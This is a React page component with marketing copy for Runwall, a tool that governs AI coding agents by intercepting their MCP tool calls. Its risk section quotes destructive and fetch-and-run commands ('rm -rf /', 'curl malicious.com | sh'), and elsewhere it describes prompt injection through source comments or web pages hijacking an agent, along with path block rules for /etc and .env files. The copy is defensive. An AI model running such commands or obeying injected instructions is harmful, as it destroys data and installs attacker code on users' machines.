import GeoPageTemplate from '../../../components/GeoPageTemplate';
import type { GeoPageData } from '../../../components/GeoPageTemplate';

const data: GeoPageData = {
  title: 'Governance for Coding Agents — Claude Code, Cursor, Copilot | Runwall',
  description: 'How Runwall governs AI coding agents like Claude Code, Cursor, and GitHub Copilot that have terminal and file-system access through MCP.',
  path: '/use-cases/coding-agents',
  breadcrumbs: [
    { name: 'Home', href: 'https://runwall.in/' },
    { name: 'Use Cases', href: 'https://runwall.in/use-cases/coding-agents' },
    { name: 'Coding Agents', href: 'https://runwall.in/use-cases/coding-agents' },
  ],
  content: [
    'AI coding agents like Claude Code, Cursor, and GitHub Copilot are increasingly granted direct access to terminal commands, file systems, and development infrastructure through MCP. While this access makes them powerful development partners, it also makes them high-risk: a coding agent with unrestricted terminal access can execute arbitrary commands, modify or delete files, install packages, and interact with databases — all without a human reviewing each action.',
    'Runwall provides execution governance for these agents by intercepting every tool call at the MCP layer. File system operations are validated against allowed-path policies. Terminal commands are risk-scored and can require approval for destructive operations. Package installations are governed by policy. The agent\'s development workflow is uninterrupted for safe operations, while high-risk actions are caught and governed before execution.',
  ],
  sections: [
    {
      heading: 'What Coding Agents Can Do Without Governance',
      body: 'A coding agent with MCP tool access can: execute arbitrary terminal commands ("rm -rf /", "curl malicious.com | sh"), read and write any file the process has access to (including .env files with credentials), install arbitrary npm/pip packages (potential supply chain attacks), modify git history, access databases, and make network requests. Without governance, a prompt injection attack embedded in source code or a web page could hijack any of these capabilities.',
    },
    {
      heading: 'How Runwall Governs Coding Agents',
      body: 'Runwall sits between the coding agent and its MCP tools. Every file operation is validated against path-based policies (e.g., allow /workspace/**, block /etc/**, block **/.env). Every terminal command is risk-scored — safe commands like "npm test" proceed immediately, while destructive commands trigger approval. If the agent reads content from an untrusted source (a web page, a PR comment), the session is tainted and downstream write operations are restricted.',
    },
  ],
  faqs: [
    {
      question: 'Does Runwall work with Cursor?',
      answer: 'Yes. Cursor supports MCP through stdio transport. You add the Runwall MCP configuration to your Cursor settings, and all tool calls from Cursor\'s AI agent flow through Runwall\'s governance pipeline. Setup takes less than a minute.',
    },
    {
      question: 'Can Runwall prevent Claude Code from running dangerous terminal commands?',
      answer: 'Yes. Runwall risk-scores every terminal command before execution. Commands with high risk scores (destructive operations, privilege escalation, network access to untrusted endpoints) can be configured to require human approval or be blocked outright. Safe commands like "npm test" or "git status" proceed without interruption.',
    },
    {
      question: 'Does Runwall slow down my coding workflow?',
      answer: 'For safe operations (file reads, safe terminal commands, git operations), Runwall\'s governance evaluation adds sub-millisecond latency — effectively invisible. Only high-risk actions trigger approval workflows, which naturally require human review time. The goal is to never interrupt safe operations while catching dangerous ones.',
    },
    {
      question: 'Can Runwall prevent a prompt injection in source code from hijacking my coding agent?',
      answer: 'Runwall\'s taint tracking flags sessions where the agent has ingested untrusted content. If a coding agent reads a file containing an injected instruction (e.g., a malicious comment in source code), the session is tainted and downstream destructive actions are restricted by policy, even if the agent has been tricked into attempting them.',
    },
  ],
  relatedLinks: [
    { label: 'Claude Code Integration', to: '/integrations/claude-code' },
    { label: 'Cursor Integration', to: '/integrations/cursor' },
    { label: 'Getting Started', to: '/docs/getting-started' },
    { label: 'AI Agent Firewall (Pillar)', to: '/ai-agent-firewall' },
  ],
};

export default function UseCasesCodingAgents() {
  return <GeoPageTemplate data={data} />;
}
